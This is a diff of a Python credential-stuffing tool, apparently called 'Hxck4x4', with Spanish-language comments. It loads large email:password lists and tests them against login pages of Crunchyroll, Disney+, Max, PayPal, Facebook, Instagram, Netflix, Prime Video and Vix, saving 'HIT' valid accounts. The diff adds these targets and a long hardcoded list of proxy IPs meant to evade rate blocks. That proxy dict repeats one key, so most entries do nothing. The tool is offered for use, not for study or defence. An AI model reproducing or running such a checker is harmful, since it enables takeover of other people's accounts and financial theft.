@@ -3,9 +3,14 @@ import os
 import time
 import re
 import logging
+import pyfiglet
+import random
+from colorama import Fore, Style, init
 from tqdm import tqdm
 from concurrent.futures import ThreadPoolExecutor
 from cryptography.fernet import Fernet
+
+
 
 # Configuración de logs
 logging.basicConfig(filename='checker_log.txt', level=logging.INFO, format='%(asctime)s - %(message)s')
@@ -33,7 +38,26 @@ def encrypt_password(password):
 def decrypt_password(encrypted_password):
     return cipher.decrypt(encrypted_password.encode()).decode()
 
-# Función para agregar cuentas al archivo desde otro archivo
+# Función para agregar cuentas al archivo 'accounts.txt' desde entrada manual
+def add_accounts_manually(filename):
+    print_cyan("\nIntroduce las cuentas en formato email:password. Escribe 'salir' para terminar.\n")
+    with open(filename, 'a') as f:
+        while True:
+            account = input("Cuenta (email:password): ")
+            if account.lower() == 'salir':
+                break
+            if ':' in account:
+                email, password = account.split(':')
+                if is_valid_email(email):
+                    encrypted_password = encrypt_password(password)
+                    f.write(f"{email}:{encrypted_password}\n")
+                    print_green(f"Cuenta añadida: {email}")
+                else:
+                    print_red(f"Email inválido: {email}")
+            else:
+                print_red("Formato incorrecto. Debe ser email:password")
+
+# Función para agregar cuentas desde otro archivo
 def add_accounts_from_file(input_filename, output_filename):
     """
     Lee cuentas desde un archivo y las agrega al archivo 'accounts.txt' encriptando las contraseñas.
@@ -107,11 +131,208 @@ def write_valid_accounts_to_file(filename, accounts):
             f.write(f"{email}:{encrypted_password}\n")
 
 # Función para manejar proxies dinámicos
-def get_proxy():
-    # Aquí puedes agregar una lista de proxies o usar un servicio de proxies rotativos
+def get_proxies():
     return {
-        "http": "http://proxy.example.com:8080",
-        "https": "http://proxy.example.com:8080"
+"http": "http://156.249.137.157:3128",
+"http": "http://156.249.137.157:3128",
+"http": "http://104.207.35.9:3128",
+"http": "http://104.207.35.9:3128",
+"http": "http://156.233.93.70:3128",
+"http": "http://156.233.93.70:3128",
+"http": "http://156.249.138.166:3128",
+"http": "http://156.249.138.166:3128",
+"http": "http://156.253.176.250:3128",
+"http": "http://156.253.176.250:3128",
+"http": "http://156.240.99.240:3128",
+"http": "http://156.240.99.240:3128",
+"http": "http://156.228.83.46:3128",
+"http": "http://156.228.83.46:3128",
+"http": "http://104.207.45.86:3128",
+"http": "http://104.207.45.86:3128",
+"http": "http://154.213.196.233:3128",
+"http": "http://154.213.196.233:3128",
+"http": "http://156.233.88.187:3128",
+"http": "http://156.233.88.187:3128",
+"http": "http://156.233.75.28:3128",
+"http": "http://156.233.75.28:3128",
+"http": "http://156.228.87.71:3128",
+"http": "http://156.228.87.71:3128",
+"http": "http://154.94.14.54:3128",
+"http": "http://154.94.14.54:3128",
+"http": "http://156.228.82.252:3128",
+"http": "http://156.228.82.252:3128",
+"http": "http://156.228.103.69:3128",
+"http": "http://156.228.103.69:3128",
+"http": "http://156.233.85.219:3128",
+"http": "http://156.233.85.219:3128",
+"http": "http://156.228.114.199:3128",
+"http": "http://156.228.114.199:3128",
+"http": "http://104.207.35.117:3128",
+"http": "http://104.207.35.117:3128",
+"http": "http://104.207.53.211:3128",
+"http": "http://104.207.53.211:3128",
+"http": "http://154.94.12.97:3128",
+"http": "http://154.94.12.97:3128",
+"http": "http://156.249.137.119:3128",
+"http": "http://156.249.137.119:3128",
+"http": "http://156.228.177.248:3128",
+"http": "http://156.228.177.248:3128",
+"http": "http://156.253.174.88:3128",
+"http": "http://156.253.174.88:3128",
+"http": "http://156.233.84.199:3128",
+"http": "http://156.233.84.199:3128",
+"http": "http://156.253.171.3:3128",
+"http": "http://156.253.171.3:3128",
+"http": "http://104.207.39.98:3128",
+"http": "http://104.207.39.98:3128",
+"http": "http://156.228.87.207:3128",
+"http": "http://156.228.87.207:3128",
+"http": "http://104.207.46.65:3128",
+"http": "http://104.207.46.65:3128",
+"http": "http://45.202.78.85:3128",
+"http": "http://45.202.78.85:3128",
+"http": "http://156.240.99.199:3128",
+"http": "http://156.240.99.199:3128",
+"http": "http://156.249.137.50:3128",
+"http": "http://156.249.137.50:3128",
+"http": "http://156.228.96.197:3128",
+"http": "http://156.228.96.197:3128",
+"http": "http://156.228.100.113:3128",
+"http": "http://156.228.100.113:3128",
+"http": "http://104.207.41.0:3128",
+"http": "http://104.207.41.0:3128",
+"http": "http://104.207.53.29:3128",
+"http": "http://104.207.53.29:3128",
+"http": "http://156.233.89.87:3128",
+"http": "http://156.233.89.87:3128",
+"http": "http://156.228.180.56:3128",
+"http": "http://156.228.180.56:3128",
+"http": "http://45.202.77.87:3128",
+"http": "http://45.202.77.87:3128",
+"http": "http://156.253.171.7:3128",
+"http": "http://156.253.171.7:3128",
+"http": "http://156.228.98.86:3128",
+"http": "http://156.228.98.86:3128",
+"http": "http://154.94.12.49:3128",
+"http": "http://154.94.12.49:3128",
+"http": "http://154.213.193.202:3128",
+"http": "http://154.213.193.202:3128",
+"http": "http://156.228.98.79:3128",
+"http": "http://156.228.98.79:3128",
+"http": "http://104.207.40.243:3128",
+"http": "http://104.207.40.243:3128",
+"http": "http://156.228.113.115:3128",
+"http": "http://156.228.113.115:3128",
+"http": "http://104.207.36.166:3128",
+"http": "http://104.207.36.166:3128",
+"http": "http://156.228.92.166:3128",
+"http": "http://156.228.92.166:3128",
+"http": "http://156.240.99.149:3128",
+"http": "http://156.240.99.149:3128",
+"http": "http://104.167.27.97:3128",
+"http": "http://104.167.27.97:3128",
+"http": "http://156.228.83.74:3128",
+"http": "http://156.228.83.74:3128",
+"http": "http://156.228.93.173:3128",
+"http": "http://156.228.93.173:3128",
+"http": "http://45.202.79.86:3128",
+"http": "http://45.202.79.86:3128",
+"http": "http://156.228.90.92:3128",
+"http": "http://156.228.90.92:3128",
+"http": "http://156.228.97.219:3128",
+"http": "http://156.228.97.219:3128",
+"http": "http://156.228.183.9:3128",
+"http": "http://156.228.183.9:3128",
+"http": "http://156.253.165.177:3128",
+"http": "http://156.253.165.177:3128",
+"http": "http://156.228.185.222:3128",
+"http": "http://156.228.185.222:3128",
+"http": "http://156.228.118.19:3128",
+"http": "http://156.228.118.19:3128",
+"http": "http://104.207.40.170:3128",
+"http": "http://104.207.40.170:3128",
+"http": "http://156.233.73.131:3128",
+"http": "http://156.233.73.131:3128",
+"http": "http://156.253.166.17:3128",
+"http": "http://156.253.166.17:3128",
+"http": "http://104.207.37.61:3128",
+"http": "http://104.207.37.61:3128",
+"http": "http://104.207.46.63:3128",
+"http": "http://104.207.46.63:3128",
+"http": "http://104.207.54.188:3128",
+"http": "http://104.207.54.188:3128",
+"http": "http://156.228.97.1:3128",
+"http": "http://156.228.97.1:3128",
+"http": "http://156.228.183.253:3128",
+"http": "http://156.228.183.253:3128",
+"http": "http://45.202.78.110:3128",
+"http": "http://45.202.78.110:3128",
+"http": "http://154.213.195.35:3128",
+"http": "http://154.213.195.35:3128",
+"http": "http://156.253.169.157:3128",
+"http": "http://156.253.169.157:3128",
+"http": "http://156.233.75.135:3128",
+"http": "http://156.233.75.135:3128",
+"http": "http://156.228.119.28:3128",
+"http": "http://156.228.119.28:3128",
+"http": "http://156.228.184.108:3128",
+"http": "http://156.228.184.108:3128",
+"http": "http://156.228.174.101:3128",
+"http": "http://156.228.174.101:3128",
+"http": "http://156.228.104.128:3128",
+"http": "http://156.228.104.128:3128",
+"http": "http://156.228.184.84:3128",
+"http": "http://156.228.184.84:3128",
+"http": "http://104.207.62.198:3128",
+"http": "http://104.207.62.198:3128",
+"http": "http://104.207.57.151:3128",
+"http": "http://104.207.57.151:3128",
+"http": "http://156.233.91.215:3128",
+"http": "http://156.233.91.215:3128",
+"http": "http://156.228.174.14:3128",
+"http": "http://156.228.174.14:3128",
+"http": "http://156.228.111.104:3128",
+"http": "http://156.228.111.104:3128",
+"http": "http://104.207.55.122:3128",
+"http": "http://104.207.55.122:3128",
+"http": "http://156.228.181.158:3128",
+"http": "http://156.228.181.158:3128",
+"http": "http://104.207.43.224:3128",
+"http": "http://104.207.43.224:3128",
+"http": "http://104.167.24.75:3128",
+"http": "http://104.167.24.75:3128",
+"http": "http://104.207.47.156:3128",
+"http": "http://104.207.47.156:3128",
+"http": "http://154.213.196.137:3128",
+"http": "http://154.213.196.137:3128",
+"http": "http://156.228.185.122:3128",
+"http": "http://156.228.185.122:3128",
+"http": "http://156.253.164.79:3128",
+"http": "http://156.253.164.79:3128",
+"http": "http://154.213.204.237:3128",
+"http": "http://154.213.204.237:3128",
+"http": "http://156.233.87.207:3128",
+"http": "http://156.233.87.207:3128",
+"http": "http://156.228.180.48:3128",
+"http": "http://156.228.180.48:3128",
+"http": "http://156.228.91.255:3128",
+"http": "http://156.228.91.255:3128",
+"http": "http://104.207.52.30:3128",
+"http": "http://104.207.52.30:3128",
+"http": "http://156.228.176.137:3128",
+"http": "http://156.228.176.137:3128",
+"http": "http://156.233.84.10:3128",
+"http": "http://156.233.84.10:3128",
+"http": "http://156.228.81.6:3128",
+"http": "http://156.228.81.6:3128",
+"http": "http://104.207.39.52:3128",
+"http": "http://104.207.39.52:3128",
+"http": "http://156.228.105.62:3128",
+"http": "http://156.228.105.62:3128",
+"http": "http://156.253.173.78:3128",
+"http": "http://156.253.173.78:3128",
+"http": "http://156.233.74.12:3128",
+"http": "http://156.233.74.12:3128"
     }
 
 # Verificación de cuentas usando multithreading
@@ -120,8 +341,15 @@ def check_accounts():
     valid_accounts_file = 'valid_accounts.txt'
     urls = {
         'Crunchyroll': 'https://sso.crunchyroll.com/es/authorize?client_id=noaihdevm_6iyg0a8l0q&redirect_uri=https%3A%2F%2Fwww.crunchyroll.com%2Fcallback&response_type=cookie&state=%2F',
-        'Disney Plus': 'https://www.disneyplus.com/login',
-        'Max': 'https://auth.max.com/login'
+        'Disney': 'https://disneyplus.com/login',
+        'Max': 'https://auth.max.com/login?redirectTo=%2Fsettings',
+        'Paypal': 'https://paypal.com/signin',
+        'Facebook': 'https://m.facebook.com',
+        'Instagram': 'https://www.instagram.com/accounts/login/?next=%2Fusers%2Fself&source=mobile_nav',
+        'Netflix': 'https://netflix.com/login',
+        'Prime': 'https://www.amazon.com.mx/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fna.primevideo.com%2Fauth%2Freturn%2Fref%3Dav_auth_ap%3F_t%3D1sgxoAyVFnFL2F-Ey9-SUGkxc1KIJiKHOEqgidm8iIKincAAAAAQAAAABnEfBlcmF3AAAAAPgWC9WfHH8iB-olH_E9xQ%26location%3Dhttps%3A%2F%2Fwww.primevideo.com%2Fsignup%3Fref_%253Ddvm_MLP_MX_Join_1&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&accountStatusPolicy=P1&openid.assoc_handle=amzn_prime_video_sso_mx&openid.mode=checkid_setup&countryCode=MX&siteState=133-3527868-5675908&language=es_ES&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0',
+        'Vix': 'https://vix.com/es-es/iniciar-sesion?lang=iniciar-sesion',
+        
     }
 
     headers = {
@@ -138,14 +366,14 @@ def check_accounts():
     print_cyan("\nPlataformas disponibles:")
     for key in urls:
         print(f"- {key}")
-    platform = input("Selecciona la plataforma para verificar cuentas (Crunchyroll, Disney Plus, Max): ")
+    platform = input("Selecciona la plataforma para verificar cuentas:  ")
     url = urls.get(platform)
 
     if not url:
         print_red("Plataforma no válida. Selecciona una de las opciones disponibles.")
         return
 
-    proxies = get_proxy()
+    proxies = get_proxies()
 
     def process_account(account):
         nonlocal hit_count, error_count
@@ -156,11 +384,11 @@ def check_accounts():
         
         if check_account(session, email, password, url, headers=headers, proxies=proxies):
             valid_accounts.append((email, password))
-            print_green(f"¡HIT! Cuenta válida: {account_str}")
+            print_green( f"\n¡HIT! Cuenta válida: {account_str}")
             logging.info(f"HIT: {account_str}")
             hit_count += 1
         else:
-            print_red(f"ERROR: Cuenta inválida: {account_str}")
+            print_red(f"\nERROR: Cuenta inválida: {account_str}")
             logging.info(f"ERROR: {account_str}")
             error_count += 1
         time.sleep(1)  # Evitar bloqueos
@@ -196,34 +424,55 @@ def menu():
         print_separator()
         print_cyan("Menú de opciones:")
         print_yellow("1. Comenzar a chequear cuentas")
-        print_yellow("2. Detener proceso")
-        print_yellow("3. Agregar lista de cuentas")
-        print_yellow("4. Ver lista de cuentas validadas")
+        print_yellow("2. Agregar cuentas manualmente")
+        print_yellow("3. Agregar cuentas desde un archivo")
+        print_yellow("4. Ver cuentas válidas")
         print_yellow("5. Reiniciar el código")
-        print_yellow("0. Salir")
-        print_separator()
-
-        option = input("Selecciona una opción: ")
-
+        print_yellow("6. Salir")
+        
+        option = input("Selecciona una opción (1-6): ")
+        
         if option == '1':
             check_accounts()
         elif option == '2':
-            print_red("Proceso detenido.")
-            break
+            add_accounts_manually('accounts.txt')
         elif option == '3':
-            input_filename = '1.txt'  # Archivo con 85,000 cuentas
-            output_filename = 'accounts.txt'           # Archivo donde se agregarán las cuentas cifradas
-            add_accounts_from_file(input_filename, output_filename)
+            input_file = input("Introduce el nombre del archivo desde el cual agregar cuentas (o ruta completa): ")
+            add_accounts_from_file(input_file, 'accounts.txt')
         elif option == '4':
             view_valid_accounts()
         elif option == '5':
-            print_yellow("Reiniciando el código...")
-            menu()
-        elif option == '0':
-            print_green("Saliendo...")
+            print_cyan("Reiniciando el código...")
+        elif option == '6':
+            print_yellow("Saliendo del programa. ¡Hasta luego!")
+            if os.path.exists("accounts.txt"):
+                os.remove("accounts.txt")
             break
         else:
-            print_red("Opción inválida. Por favor, selecciona una opción válida.")
+            print_red("Opción no válida. Por favor, selecciona una opción entre 1 y 6.")
+# Inicializa Colorama
+init(autoreset=True)
 
-if __name__ == '__main__':
+def clear_screen():
+    # Comando para limpiar la pantalla según el sistema operativo
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+def imprimir_texto_ascii_coloreado():
+    # Crear un texto en ASCII con pyfiglet
+    ascii_art = pyfiglet.figlet_format("Hxck4x4", font="banner")
+    # Separar las líneas del arte ASCII
+    lines = ascii_art.splitlines()
+    
+    # Colores disponibles
+    colores = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.CYAN, Fore.MAGENTA]
+
+    # Imprimir cada línea en un color aleatorio
+    for line in lines:
+        print(random.choice(colores) + line)
+
+if __name__ == "__main__":
+    clear_screen()  # Limpiar la pantalla
+    imprimir_texto_ascii_coloreado()  # Imprimir el texto ASCII coloreado
+# Ejecutar el menú
+if __name__ == "__main__":
     menu()
